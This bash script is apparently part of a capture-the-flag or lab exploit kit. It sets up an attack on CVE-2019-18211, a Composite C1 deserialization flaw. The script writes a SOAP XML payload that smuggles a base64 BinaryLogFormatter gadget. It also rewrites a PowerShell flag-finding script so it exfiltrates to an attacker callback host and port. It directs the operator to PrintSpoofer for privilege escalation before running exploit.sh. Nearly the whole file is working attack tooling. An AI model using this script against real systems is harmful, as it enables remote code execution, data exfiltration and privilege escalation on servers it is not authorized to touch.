#!/bin/bash
# Setup script - prepares all files for exploitation

WORKDIR="$(cd "$(dirname "$0")" && pwd)"
source "${WORKDIR}/config.sh"

echo "[*] Setting up exploit for ${TARGET} with callback ${LHOST}:${LPORT}"

# Create www directory
mkdir -p "${WORKDIR}/www"

# Update find_flags.ps1 with correct exfil server
sed "s|http://10.10.14.4:9001|http://${LHOST}:${LPORT}|g" "${WORKDIR}/find_flags.ps1" > "${WORKDIR}/www/find_flags.ps1"
echo "[+] Created www/find_flags.ps1"

# Create XML payload (CVE-2019-18211)
cat > "${WORKDIR}/www/payload.xml" << XMLEOF
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:man="http://www.composite.net/ns/management">
  <soap:Header/>
  <soap:Body>
    <man:GetMultipleChildren>
      <man:clientProviderNameEntityTokenPairs>
        <man:RefreshChildrenParams>
          <man:ProviderName>test</man:ProviderName>
          <man:EntityToken>entityTokenType='Microsoft.Practices.EnterpriseLibrary.Logging.Formatters.BinaryLogFormatter' entityToken='${PAYLOAD_B64}'</man:EntityToken>
        </man:RefreshChildrenParams>
      </man:clientProviderNameEntityTokenPairs>
    </man:GetMultipleChildren>
  </soap:Body>
</soap:Envelope>
XMLEOF
echo "[+] Created www/payload.xml"

# Check for PrintSpoofer
if [ ! -f "${WORKDIR}/www/PrintSpoofer64.exe" ]; then
    echo "[!] WARNING: PrintSpoofer64.exe not found in www/"
    echo "    Download from: https://github.com/itm4n/PrintSpoofer/releases"
fi

echo "[+] Setup complete!"
echo ""
echo "Next steps:"
echo "  1. Add PrintSpoofer64.exe to www/ (for privesc)"
echo "  2. Run: ./exploit.sh"

